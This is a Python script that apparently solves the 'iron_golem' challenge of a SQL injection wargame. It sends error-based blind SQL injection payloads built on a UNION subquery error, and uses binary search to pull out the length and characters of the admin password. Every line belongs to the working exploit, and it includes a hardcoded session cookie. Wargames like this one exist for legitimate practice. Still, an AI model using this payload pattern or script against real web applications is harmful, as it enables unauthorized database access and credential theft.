
import requests
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

cookie = {'PHPSESSID': 'o390n0a72vrspg30ujnemh0bnf'}


def check(data):
    return "Subquery returns" in data


ok = 0
ng = 60

while ok + 1 != ng:
    md = (ok + ng) // 2
    q = f"' || id = 'admin' && IF({md} <= length(pw),(SELECT 1 UNION SELECT 2),2) #"
    res = requests.get(url, params={'pw': q}, cookies=cookie)
    print(f"[+] try {md}")
    if check(res.text):
        ok = md
    else:
        ng = md

length = ok
print(f"[*] length = {length}")

ans = ""
for i in range(0, length):
    ok = 0
    ng = 256

    while ok + 1 != ng:
        md = (ok + ng) // 2
        q = f"' || id = 'admin' && IF({md} <= ascii(substr(pw,{i+1},1)),(SELECT 1 union select 2),2) #"
        res = requests.get(url, params={'pw': q}, cookies=cookie)
        print(f"[+] try {md}")
        if check(res.text):
            ok = md
        else:
            ng = md

    ans += str(chr(ok))
    print(f"[*] {ans}")

print(f"[*] find! {ans}")
